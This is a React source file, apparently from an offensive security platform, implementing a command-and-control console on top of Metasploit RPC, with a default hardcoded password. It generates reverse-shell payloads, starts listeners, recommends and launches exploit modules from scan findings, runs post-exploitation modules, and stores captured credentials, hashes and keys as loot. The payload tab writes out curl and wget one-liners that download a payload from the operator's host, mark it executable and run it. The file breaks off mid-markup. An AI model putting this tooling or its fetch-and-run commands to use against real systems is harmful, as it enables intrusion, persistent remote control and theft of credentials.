import { useState, useEffect, useRef } from 'react'
import {
  Terminal as TerminalIcon, Package, Radio, Database,
  Wifi, WifiOff, RefreshCw, Trash2, Play,
  Copy, Check, Download, ChevronRight,
  Shield, Zap, Eye, EyeOff, X, Crosshair
} from 'lucide-react'
import Terminal, { TerminalHandle } from '../components/Terminal'
import type { Project } from '../types'

// ── Types ──────────────────────────────────────────────────────────

interface MsfStatus {
  connected: boolean
  version?: string
  sessions?: number
  jobs?: number
}

interface C2Session {
  id: string
  msf_session_id?: string
  session_type: string
  platform: string
  arch: string
  remote_host: string
  remote_port: string
  tunnel_peer: string
  via_exploit: string
  via_payload: string
  status: 'active' | 'inactive' | 'lost'
  notes: string
  established_at: string
  last_seen: string
  loot_count: number
  task_count: number
  live: boolean
}

interface LootEntry {
  id: string
  session_id: string
  loot_type: string
  title: string
  content: string
  source_path: string
  captured_at: string
}

interface PayloadDef {
  value: string
  label: string
  platform: string
  arch: string
  formats: string[]
}

interface Listener {
  job_id: string
  name: string
  started_at: string
  datastore: Record<string, string>
}

interface PostModule {
  name: string
  label: string
  description: string
}

// ── Status badge ───────────────────────────────────────────────────

function SessionStatusBadge({ status, live }: { status: string; live: boolean }) {
  if (status === 'active' && live) {
    return (
      <span className="flex items-center gap-1.5 text-xs font-semibold text-green-400">
        <span className="relative flex h-2 w-2">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
          <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
        </span>
        ACTIVE
      </span>
    )
  }
  if (status === 'lost') {
    return (
      <span className="flex items-center gap-1.5 text-xs font-semibold text-red-400">
        <span className="relative flex h-2 w-2">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" />
          <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
        </span>
        LOST
      </span>
    )
  }
  return (
    <span className="flex items-center gap-1.5 text-xs font-semibold text-slate-500">
      <span className="inline-flex rounded-full h-2 w-2 bg-slate-600" />
      INACTIVE
    </span>
  )
}

// ── Main component ─────────────────────────────────────────────────

export default function C2Console() {
  const [activeTab, setActiveTab] = useState<'sessions' | 'payloads' | 'listeners' | 'attack' | 'loot'>('sessions')
  const [projects, setProjects] = useState<Project[]>([])
  const [selectedProject, setSelectedProject] = useState('')
  const [msfStatus, setMsfStatus] = useState<MsfStatus>({ connected: false })
  const [sessions, setSessions] = useState<C2Session[]>([])
  const [activeSession, setActiveSession] = useState<C2Session | null>(null)
  const [loot, setLoot] = useState<LootEntry[]>([])
  const [payloads, setPayloads] = useState<PayloadDef[]>([])
  const [listeners, setListeners] = useState<Listener[]>([])
  const [postModules, setPostModules] = useState<PostModule[]>([])
  const [postHistory, setPostHistory] = useState<Array<{id: string; label: string; ts: Date; output: string | null; error: string | null; running: boolean}>>([])
  const [expandedHistory, setExpandedHistory] = useState<Set<string>>(new Set())
  const [loading, setLoading] = useState(false)
  const [copied, setCopied] = useState('')
  const [showLootContent, setShowLootContent] = useState<string | null>(null)
  const terminalRef = useRef<TerminalHandle>(null)
  const wsRef = useRef<WebSocket | null>(null)
  const inputRef = useRef<HTMLInputElement>(null)
  const sessionPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // MSF connect form
  const [msfHost, setMsfHost] = useState('127.0.0.1')
  const [msfPort, setMsfPort] = useState('55553')
  const [msfPass, setMsfPass] = useState('seraph')
  const [connecting, setConnecting] = useState(false)
  const [connectError, setConnectError] = useState('')

  // Payload builder form
  const [selPayload, setSelPayload] = useState('')
  const [lhost, setLhost] = useState('')
  const [lport, setLport] = useState('4444')
  const [payloadFmt, setPayloadFmt] = useState('elf')
  const [generatingPayload, setGeneratingPayload] = useState(false)
  const [autoStartListener, setAutoStartListener] = useState(false)

  // Listener form
  const [listenerPayload, setListenerPayload] = useState('linux/x64/meterpreter/reverse_tcp')
  const [listenerLhost, setListenerLhost] = useState('0.0.0.0')
  const [listenerLport, setListenerLport] = useState('4444')
  const [startingListener, setStartingListener] = useState(false)

  // Module run state per card index
  const [runningModule, setRunningModule] = useState<number | null>(null)
  const [moduleResults, setModuleResults] = useState<Record<number, ModuleRunResult>>({})

  // Attack plan
  interface AttackRec {
    module: string
    payload: string
    options: Record<string, string>
    description: string
    confidence: 'high' | 'medium' | 'low'
    match_reason: string
    finding_title: string
    finding_severity: string
    post_modules: string[]
  }
  interface ModuleRunResult {
    error?: string
    job_id?: string | null
    new_session_id?: string | null
    msf_result?: Record<string, unknown>
  }
  interface AttackPlanResult {
    recommendations: AttackRec[]
    unmatched_findings: { title: string; severity: string; cve_id: string | null }[]
    target_count: number
    finding_count: number
    matched_count: number
  }
  const [attackPlan, setAttackPlan] = useState<AttackPlanResult | null>(null)
  const [attackPlanError, setAttackPlanError] = useState('')
  const [generatingAttack, setGeneratingAttack] = useState(false)

  // Terminal input
  const [termInput, setTermInput] = useState('')

  useEffect(() => {
    loadProjects()
    checkStatus()
    loadPayloads()
  }, [])

  useEffect(() => {
    if (selectedProject) {
      loadSessions()
      loadLoot()
    }
  }, [selectedProject])

  useEffect(() => {
    if (msfStatus.connected) {
      loadListeners()
    }
  }, [msfStatus.connected])

  useEffect(() => {
    if (activeSession) {
      loadPostModules(activeSession.platform)
      connectTerminal(activeSession)
      setPostHistory([])
      setExpandedHistory(new Set())
    }
    return () => { wsRef.current?.close() }
  }, [activeSession?.id])

  useEffect(() => {
    if (activeTab === 'listeners') loadListeners()
  }, [activeTab])

  async function loadProjects() {
    const res = await fetch('/api/v1/projects')
    const data = await res.json()
    setProjects(data)
    if (data.length > 0) setSelectedProject(data[0].id)
  }

  async function checkStatus() {
    const res = await fetch('/api/v1/c2/status')
    if (res.ok) setMsfStatus(await res.json())
  }

  async function loadPayloads() {
    const res = await fetch('/api/v1/c2/payloads')
    if (res.ok) setPayloads(await res.json())
  }

  async function loadSessions() {
    if (!selectedProject) return
    const res = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
    if (res.ok) setSessions(await res.json())
  }

  async function loadLoot() {
    if (!selectedProject) return
    const res = await fetch(`/api/v1/c2/loot?project_id=${selectedProject}`)
    if (res.ok) setLoot(await res.json())
  }

  async function loadListeners() {
    const res = await fetch('/api/v1/c2/listeners')
    if (res.ok) setListeners(await res.json())
  }

  async function loadPostModules(platform: string) {
    const p = platform.toLowerCase().includes('win') ? 'windows' : platform.toLowerCase().includes('linux') ? 'linux' : 'multi'
    const res = await fetch(`/api/v1/c2/post-modules?platform=${p}`)
    if (res.ok) setPostModules(await res.json())
  }

  async function handleConnect() {
    setConnecting(true)
    setConnectError('')
    try {
      const res = await fetch('/api/v1/c2/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host: msfHost, port: parseInt(msfPort), password: msfPass, ssl: false }),
      })
      if (!res.ok) {
        const err = await res.json()
        setConnectError(err.detail || 'Connection failed')
      } else {
        setMsfStatus(await res.json())
        loadListeners()
      }
    } catch (e: unknown) {
      setConnectError(e instanceof Error ? e.message : 'Connection failed')
    } finally {
      setConnecting(false)
    }
  }

  async function handleSync() {
    if (!selectedProject) return
    setLoading(true)
    try {
      await fetch(`/api/v1/c2/sessions/sync?project_id=${selectedProject}`, { method: 'POST' })
      await loadSessions()
    } finally {
      setLoading(false)
    }
  }

  async function handleKillSession(session: C2Session) {
    await fetch(`/api/v1/c2/sessions/${session.id}?kill=true`, { method: 'DELETE' })
    if (activeSession?.id === session.id) setActiveSession(null)
    loadSessions()
  }

  async function handleGeneratePayload() {
    if (!selPayload || !lhost || !lport) return
    setGeneratingPayload(true)
    try {
      const payload = payloads.find(p => p.value === selPayload)
      const res = await fetch('/api/v1/c2/payloads/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: selPayload,
          lhost,
          lport: parseInt(lport),
          format: payloadFmt,
          arch: payload?.arch === 'x64' ? 'x86_64' : payload?.arch || 'x86_64',
          platform: payload?.platform || 'linux',
        }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Payload generation failed')
        return
      }
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      const cd = res.headers.get('Content-Disposition') || ''
      const match = cd.match(/filename="(.+)"/)
      a.download = match?.[1] || 'payload.bin'
      a.click()
      URL.revokeObjectURL(url)

      if (autoStartListener) {
        const lres = await fetch('/api/v1/c2/listeners/start', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ payload: selPayload, lhost, lport: parseInt(lport) }),
        })
        if (lres.ok) {
          await loadListeners()
          setActiveTab('listeners')
        } else {
          const err = await lres.json()
          alert(err.detail || 'Listener failed to start')
        }
      }
    } finally {
      setGeneratingPayload(false)
    }
  }

  async function handleStartListener() {
    setStartingListener(true)
    try {
      const res = await fetch('/api/v1/c2/listeners/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: listenerPayload, lhost: listenerLhost, lport: parseInt(listenerLport) }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Failed to start listener')
      } else {
        await loadListeners()
      }
    } finally {
      setStartingListener(false)
    }
  }

  async function handleStopListener(jobId: string) {
    await fetch(`/api/v1/c2/listeners/${jobId}`, { method: 'DELETE' })
    loadListeners()
  }

  async function handleGenerateAttackPlan() {
    if (!selectedProject) return
    setGeneratingAttack(true)
    setAttackPlanError('')
    setAttackPlan(null)
    try {
      const res = await fetch('/api/v1/c2/attack-plan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ project_id: selectedProject, lhost }),
      })
      const data = await res.json()
      if (!res.ok) { setAttackPlanError(data.detail || 'Failed to generate plan'); return }
      setAttackPlan(data)
    } catch (e: unknown) {
      setAttackPlanError(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setGeneratingAttack(false)
    }
  }

  function startSessionPolling() {
    if (sessionPollRef.current) clearInterval(sessionPollRef.current)
    const deadline = Date.now() + 60_000
    sessionPollRef.current = setInterval(async () => {
      await handleSync()
      if (Date.now() >= deadline) {
        clearInterval(sessionPollRef.current!)
        sessionPollRef.current = null
      }
    }, 3000)
  }

  async function handleRunModule(rec: AttackRec, idx: number) {
    if (!msfStatus.connected) return
    setRunningModule(idx)
    setModuleResults(prev => { const n = { ...prev }; delete n[idx]; return n })
    try {
      const res = await fetch('/api/v1/c2/run-module', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          module: rec.module,
          options: rec.options,
          payload: rec.payload,
          project_id: selectedProject,
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setModuleResults(prev => ({ ...prev, [idx]: { error: data.detail || 'Failed' } }))
      } else {
        setModuleResults(prev => ({ ...prev, [idx]: data }))
        await handleSync()
        // Keep polling for 60s in case reverse shell stages slowly
        if (!data.new_session_id) startSessionPolling()
      }
    } catch (e: unknown) {
      setModuleResults(prev => ({ ...prev, [idx]: { error: e instanceof Error ? e.message : 'Unknown error' } }))
    } finally {
      setRunningModule(null)
    }
  }

  async function handleRunPostModule(mod: PostModule) {
    if (!activeSession) return
    const entryId = `${mod.name}-${Date.now()}`
    const entry = { id: entryId, label: mod.label, ts: new Date(), output: null, error: null, running: true }
    setPostHistory(prev => [entry, ...prev])
    setExpandedHistory(prev => new Set(prev).add(entryId))
    terminalRef.current?.writeln(`\x1b[33m[*] ${mod.label}\x1b[0m`)
    try {
      const res = await fetch('/api/v1/c2/post-modules/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: activeSession.id, module_name: mod.name }),
      })
      if (!res.body) throw new Error('No stream body')
      const reader = res.body.getReader()
      const decoder = new TextDecoder()
      let accumulated = ''
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        const text = decoder.decode(value, { stream: true })
        for (const raw of text.split('\n')) {
          const line = raw.startsWith('data: ') ? raw.slice(6) : raw
          if (!line) continue
          if (line === '[DONE]') break
          accumulated += (accumulated ? '\n' : '') + line
          setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, output: accumulated } : e))
          terminalRef.current?.writeln(line)
          if (line.startsWith('[+] New session')) loadSessions()
        }
      }
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false } : e))
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Unknown error'
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false, error: msg } : e))
    }
  }

  function connectTerminal(session: C2Session) {
    wsRef.current?.close()
    const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
    const ws = new WebSocket(`${wsProto}//${window.location.host}/ws/c2/${session.id}`)
    wsRef.current = ws
    terminalRef.current?.clear()

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data)
      if (msg.type === 'stdout') terminalRef.current?.write(msg.data)
      else if (msg.type === 'stderr') terminalRef.current?.write('\x1b[31m' + msg.data + '\x1b[0m')
      else if (msg.type === 'error') terminalRef.current?.writeln(`\x1b[31m[ERROR] ${msg.data}\x1b[0m`)
    }
    ws.onerror = () => terminalRef.current?.writeln('\x1b[31m[WS ERROR]\x1b[0m')
    ws.onclose = () => terminalRef.current?.writeln('\x1b[90m\r\n[disconnected]\x1b[0m')
  }

  function sendCommand() {
    const cmd = termInput.trim()
    if (!cmd || !wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return
    wsRef.current.send(JSON.stringify({ action: 'exec', command: cmd }))
    setTermInput('')
  }

  function copyText(text: string, key: string) {
    navigator.clipboard.writeText(text)
    setCopied(key)
    setTimeout(() => setCopied(''), 2000)
  }

  const LOOT_COLORS: Record<string, string> = {
    credential: 'text-amber-400 border-amber-500/30 bg-amber-950/30',
    hash: 'text-red-400 border-red-500/30 bg-red-950/30',
    file: 'text-blue-400 border-blue-500/30 bg-blue-950/30',
    key: 'text-purple-400 border-purple-500/30 bg-purple-950/30',
    secret: 'text-orange-400 border-orange-500/30 bg-orange-950/30',
    system_info: 'text-cyan-400 border-cyan-500/30 bg-cyan-950/20',
  }

  const inputClass = "bg-[#05080d] border border-cyan-900/30 rounded px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-cyan-500/50 w-full"

  return (
    <div className="flex h-full gap-4 overflow-hidden">
      {/* Left panel */}
      <div className="w-72 flex-shrink-0 flex flex-col gap-3 min-h-0">

        {/* MSF Connection status */}
        <div className={`glass rounded-xl p-4 border ${msfStatus.connected ? 'border-green-500/20' : 'border-red-500/20'}`}>
          <div className="flex items-center gap-2 mb-3">
            {msfStatus.connected
              ? <Wifi size={16} className="text-green-400" />
              : <WifiOff size={16} className="text-red-400" />
            }
            <span className="text-sm font-semibold text-slate-200">Metasploit RPC</span>
            {msfStatus.connected && (
              <span className="ml-auto text-xs font-mono text-green-400">v{msfStatus.version}</span>
            )}
          </div>

          {msfStatus.connected ? (
            <div className="grid grid-cols-2 gap-2">
              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
                <div className="text-xl font-bold font-mono text-cyan-400">{msfStatus.sessions}</div>
                <div className="text-[10px] text-slate-500">Sessions</div>
              </div>
              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
                <div className="text-xl font-bold font-mono text-amber-400">{msfStatus.jobs}</div>
                <div className="text-[10px] text-slate-500">Jobs</div>
              </div>
            </div>
          ) : (
            <div className="space-y-2">
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="text-[10px] text-slate-500 mb-1 block">Host</label>
                  <input value={msfHost} onChange={e => setMsfHost(e.target.value)} className={inputClass} placeholder="127.0.0.1" />
                </div>
                <div>
                  <label className="text-[10px] text-slate-500 mb-1 block">Port</label>
                  <input value={msfPort} onChange={e => setMsfPort(e.target.value)} className={inputClass} placeholder="55553" />
                </div>
              </div>
              <div>
                <label className="text-[10px] text-slate-500 mb-1 block">Password</label>
                <input type="password" value={msfPass} onChange={e => setMsfPass(e.target.value)} className={inputClass} placeholder="msfrpcd password" />
              </div>
              {connectError && <p className="text-xs text-red-400">{connectError}</p>}
              <button
                onClick={handleConnect}
                disabled={connecting}
                className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 text-sm text-white font-medium transition-all hover:shadow-glow-cyan"
              >
                {connecting ? 'Connecting...' : 'Connect to MSF'}
              </button>
            </div>
          )}
        </div>

        {/* Project selector */}
        <div className="glass glass-hover rounded-xl p-4">
          <label className="text-xs text-slate-500 mb-2 block">Project</label>
          <select className={inputClass} value={selectedProject} onChange={e => setSelectedProject(e.target.value)}>
            <option value="">Select project...</option>
            {projects.map(p => <option key={p.id} value={p.id}>{p.name}</option>)}
          </select>
        </div>

        {/* Session list */}
        <div className="glass rounded-xl flex-1 flex flex-col min-h-0 overflow-hidden">
          <div className="px-4 py-3 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Sessions</span>
            <div className="flex gap-1">
              <button onClick={handleSync} disabled={loading || !msfStatus.connected} title="Sync from MSF" className="text-slate-500 hover:text-cyan-400 transition-colors p-1 disabled:opacity-40">
                <RefreshCw size={13} className={loading ? 'animate-spin' : ''} />
              </button>
            </div>
          </div>
          <div className="overflow-y-auto flex-1">
            {sessions.length === 0 ? (
              <div className="text-center text-slate-600 py-8 px-4 text-xs">
                <Shield size={28} className="mx-auto mb-2 opacity-20" />
                No sessions yet. Sync from MSF or add manually.
              </div>
            ) : sessions.map(s => (
              <div
                key={s.id}
                onClick={() => setActiveSession(s)}
                className={`flex items-start gap-3 px-4 py-3 cursor-pointer border-b border-cyan-900/10 transition-colors ${
                  activeSession?.id === s.id ? 'bg-cyan-900/10 border-l-2 border-l-cyan-500' : 'hover:bg-cyan-950/10'
                }`}
              >
                <TerminalIcon size={14} className={`mt-0.5 flex-shrink-0 ${s.status === 'active' && s.live ? 'text-green-400' : s.status === 'lost' ? 'text-red-400' : 'text-slate-600'}`} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-slate-200 truncate">
                      {s.remote_host || 'unknown'}
                      {s.msf_session_id && <span className="text-slate-600 ml-1">#{s.msf_session_id}</span>}
                    </span>
                    <div className="flex items-center gap-1.5">
                      <SessionStatusBadge status={s.status} live={s.live} />
                      <button
                        onClick={e => { e.stopPropagation(); handleKillSession(s) }}
                        className="text-slate-600 hover:text-red-400 transition-colors"
                        title="Kill & delete session"
                      >
                        <X size={12} />
                      </button>
                    </div>
                  </div>
                  <div className="text-[10px] text-slate-500 mt-0.5">{s.session_type} · {s.platform || '?'} · {s.arch || '?'}</div>
                  {s.via_exploit && <div className="text-[10px] text-slate-600 truncate">{s.via_exploit}</div>}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Main panel */}
      <div className="flex-1 flex flex-col min-w-0 min-h-0">
        {/* Tabs */}
        <div className="flex items-center gap-2 mb-3 flex-shrink-0">
          <div className="flex gap-1 glass rounded-lg p-1">
            {([
              { id: 'sessions', icon: <TerminalIcon size={13} />, label: 'Console' },
              { id: 'payloads', icon: <Package size={13} />, label: 'Payloads' },
              { id: 'listeners', icon: <Radio size={13} />, label: 'Listeners' },
              { id: 'attack', icon: <Crosshair size={13} />, label: 'Attack Plan' },
              { id: 'loot', icon: <Database size={13} />, label: `Loot (${loot.length})` },
            ] as const).map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium transition-colors ${
                  activeTab === tab.id ? 'bg-cyan-600 text-white shadow-glow-cyan' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {tab.icon} {tab.label}
              </button>
            ))}
          </div>
          {activeSession && (
            <div className="ml-auto flex items-center gap-2 text-xs">
              <span className="font-mono text-cyan-400" style={{ textShadow: '0 0 8px rgba(6,182,212,0.4)' }}>
                {activeSession.remote_host}:{activeSession.remote_port}
              </span>
              <span className="text-slate-600">·</span>
              <span className="text-slate-400">{activeSession.session_type}</span>
              <button onClick={() => handleKillSession(activeSession)} className="text-slate-600 hover:text-red-400 transition-colors ml-2" title="Kill session">
                <X size={14} />
              </button>
            </div>
          )}
        </div>

        {/* Console tab */}
        {activeTab === 'sessions' && (
          <div className="flex-1 flex gap-3 min-h-0">
            {/* Terminal */}
            <div className="flex-1 flex flex-col min-h-0">
              {activeSession ? (
                <>
                  <Terminal ref={terminalRef} className="flex-1 rounded-xl overflow-hidden border border-cyan-900/20 shadow-glow-cyan" />
                  {/* Command input */}
                  <div className="flex gap-2 mt-2 flex-shrink-0">
                    <div className="flex items-center gap-2 flex-1 glass rounded-lg px-3 py-2 border border-cyan-900/30">
                      <span className="text-green-400 font-mono text-xs flex-shrink-0">seraph@c2 &gt;</span>
                      <input
                        ref={inputRef}
                        value={termInput}
                        onChange={e => setTermInput(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter') sendCommand() }}
                        placeholder="Enter command..."
                        className="flex-1 bg-transparent text-sm text-slate-200 focus:outline-none font-mono placeholder-slate-700"
                        autoFocus
                      />
                    </div>
                    <button onClick={sendCommand} className="px-3 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition-all hover:shadow-glow-cyan flex-shrink-0">
                      <ChevronRight size={16} />
                    </button>
                  </div>
                </>
              ) : (
                <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600">
                  <TerminalIcon size={40} className="mb-3 opacity-20 text-cyan-600" />
                  <p className="text-sm">Select a session from the left to open a console</p>
                  <p className="text-xs mt-1 text-slate-700">or sync active sessions from Metasploit</p>
                </div>
              )}
            </div>

            {/* Post-exploitation sidebar */}
            {activeSession && (
              <div className="w-64 flex-shrink-0 flex flex-col gap-2 min-h-0">
                {/* Module buttons */}
                <div className="glass rounded-xl overflow-hidden flex flex-col" style={{ maxHeight: '240px' }}>
                  <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0">
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Post Modules</span>
                  </div>
                  <div className="overflow-y-auto p-2 space-y-1">
                    {postModules.map(mod => {
                      const isRunning = postHistory.some(e => e.label === mod.label && e.running)
                      return (
                        <button
                          key={mod.name}
                          onClick={() => handleRunPostModule(mod)}
                          disabled={isRunning}
                          title={mod.description}
                          className="w-full text-left px-3 py-2 rounded-lg text-xs text-slate-300 hover:bg-cyan-950/20 hover:text-cyan-300 border border-transparent hover:border-cyan-900/30 transition-all flex items-center gap-2 group disabled:opacity-50"
                        >
                          {isRunning
                            ? <RefreshCw size={11} className="text-cyan-500 animate-spin flex-shrink-0" />
                            : <Zap size={11} className="text-slate-600 group-hover:text-cyan-500 flex-shrink-0" />}
                          <span className="truncate">{mod.label}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>

                {/* Run history */}
                {postHistory.length > 0 && (
                  <div className="glass rounded-xl overflow-hidden flex flex-col flex-1 min-h-0">
                    <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
                      <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Results</span>
                      <button onClick={() => setPostHistory([])} className="text-slate-600 hover:text-red-400 transition-colors" title="Clear history">
                        <X size={11} />
                      </button>
                    </div>
                    <div className="overflow-y-auto flex-1 divide-y divide-cyan-900/10">
                      {postHistory.map(entry => (
                        <div key={entry.id} className="text-xs">
                          <button
                            onClick={() => setExpandedHistory(prev => {
                              const n = new Set(prev)
                              n.has(entry.id) ? n.delete(entry.id) : n.add(entry.id)
                              return n
                            })}
                            className="w-full flex items-center gap-2 px-3 py-2 hover:bg-cyan-950/10 transition-colors text-left"
                          >
                            {entry.running
                              ? <RefreshCw size={10} className="text-cyan-400 animate-spin flex-shrink-0" />
                              : entry.error
                                ? <span className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
                                : <span className="w-2 h-2 rounded-full bg-green-500 flex-shrink-0" />}
                            <span className="flex-1 truncate text-slate-300">{entry.label}</span>
                            <span className="text-slate-600 flex-shrink-0">{entry.ts.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
                          </button>
                          {expandedHistory.has(entry.id) && (
                            <div className="px-3 pb-2 space-y-2">
                              {(() => {
                                const leads = entry.output
                                  ? entry.output.split('\n').filter(l => l.startsWith('[+]'))
                                  : []
                                return leads.length > 0 && !entry.running ? (
                                  <div className="rounded-lg border border-green-800/40 bg-green-950/20 p-2 space-y-1">
                                    <div className="text-[10px] font-semibold text-green-400 uppercase tracking-wider mb-1">
                                      {leads.length} Lead{leads.length !== 1 ? 's' : ''}
                                    </div>
                                    {leads.map((l, i) => {
                                      const match = l.match(/exploit\/[\w/]+/)
                                      const module = match ? match[0] : null
                                      const desc = l.replace(/\[\+\]\s*[\d\.]+\s*-\s*(exploit\/[\w/]+)?\s*:?\s*/, '').trim()
                                      return (
                                        <div key={i} className="flex items-start gap-1.5">
                                          <span className="text-green-500 flex-shrink-0 mt-0.5">›</span>
                                          <div className="min-w-0">
                                            {module && (
                                              <div className="flex items-center gap-1">
                                                <span className="text-[10px] font-mono text-green-300 truncate">{module}</span>
                                                <button
                                                  onClick={() => { navigator.clipboard.writeText(module); setCopied(module) }}
                                                  className="text-slate-600 hover:text-green-400 flex-shrink-0 transition-colors"
                                                  title="Copy module path"
                                                >
                                                  {copied === module ? <span className="text-[9px] text-green-400">✓</span> : <Copy size={9} />}
                                                </button>
                                              </div>
                                            )}
                                            <span className="text-[9px] text-slate-400">{desc}</span>
                                          </div>
                                        </div>
                                      )
                                    })}
                                  </div>
                                ) : null
                              })()}
                              {entry.running
                                ? <span className="text-slate-500 italic">Running…</span>
                                : entry.error
                                  ? <span className="text-red-400">{entry.error}</span>
                                  : entry.output
                                    ? <pre className="text-[10px] text-slate-300 whitespace-pre-wrap break-all max-h-48 overflow-y-auto font-mono leading-relaxed">{entry.output}</pre>
                                    : <span className="text-slate-600 italic">No output</span>}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Payloads tab */}
        {activeTab === 'payloads' && (
          <div className="flex-1 overflow-y-auto space-y-4">
            <div className="glass rounded-xl p-5 border border-cyan-900/20">
              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
                <Package size={14} className="text-cyan-400" /> Generate Payload (msfvenom)
              </h3>
              <div className="grid grid-cols-2 gap-4">
                <div className="col-span-2">
                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={selPayload} onChange={e => {
                    setSelPayload(e.target.value)
                    const p = payloads.find(x => x.value === e.target.value)
                    if (p) setPayloadFmt(p.formats[0])
                  }}>
                    <option value="">Select payload...</option>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
                  <input value={lhost} onChange={e => setLhost(e.target.value)} className={inputClass} placeholder="192.168.1.100" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
                  <input value={lport} onChange={e => setLport(e.target.value)} className={inputClass} placeholder="4444" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">Format</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={payloadFmt} onChange={e => setPayloadFmt(e.target.value)}>
                    {(payloads.find(p => p.value === selPayload)?.formats || ['elf','exe','raw']).map(f => (
                      <option key={f} value={f}>{f}</option>
                    ))}
                  </select>
                </div>
                <div className="col-span-2 flex items-center gap-2 pt-1">
                  <input
                    id="auto-listener"
                    type="checkbox"
                    checked={autoStartListener}
                    onChange={e => setAutoStartListener(e.target.checked)}
                    className="w-3.5 h-3.5 accent-cyan-500 cursor-pointer"
                  />
                  <label htmlFor="auto-listener" className="text-xs text-slate-400 cursor-pointer select-none">
                    Auto-start listener after generating
                  </label>
                </div>
                <div className="flex items-end">
                  <button
                    onClick={handleGeneratePayload}
                    disabled={generatingPayload || !selPayload || !lhost}
                    className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-sm text-white font-medium transition-all hover:shadow-glow-cyan flex items-center justify-center gap-2"
                  >
                    {generatingPayload ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
                    {generatingPayload ? 'Generating...' : 'Download Payload'}
                  </button>
                </div>
              </div>

              {/* One-liner staging commands */}
              {selPayload && lhost && lport && (
                <div className="mt-4 space-y-2">
                  <div className="text-xs text-slate-500 mb-2">Quick staging commands:</div>
                  {[
                    { label: 'Python HTTP server', cmd: `python3 -m http.server 8080` },
                    { label: 'curl download', cmd: `curl http://${lhost}:8080/payload.${payloadFmt} -o /tmp/p && chmod +x /tmp/p && /tmp/p` },
                    { label: 'wget download', cmd: `wget http://${lhost}:8080/payload.${payloadFmt} -O /tmp/p && chmod +x /tmp/p && /tmp/p` },
                  ].map(item => (
                    <div key={item.label} className="flex items-center gap-2 bg-[#05080d] rounded-lg px-3 py-2 border border-cyan-900/20">
                      <span className="text-[10px] text-slate-600 w-28 flex-shrink-0">{item.label}</span>
                      <code className="flex-1 text-xs font-mono text-slate-300 truncate">{item.cmd}</code>
                      <button onClick={() => copyText(item.cmd, item.label)} className="text-slate-600 hover:text-cyan-400 flex-shrink-0">
                        {copied === item.label ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Listeners tab */}
        {activeTab === 'listeners' && (
          <div className="flex-1 overflow-y-auto space-y-4">
            {/* Start listener form */}
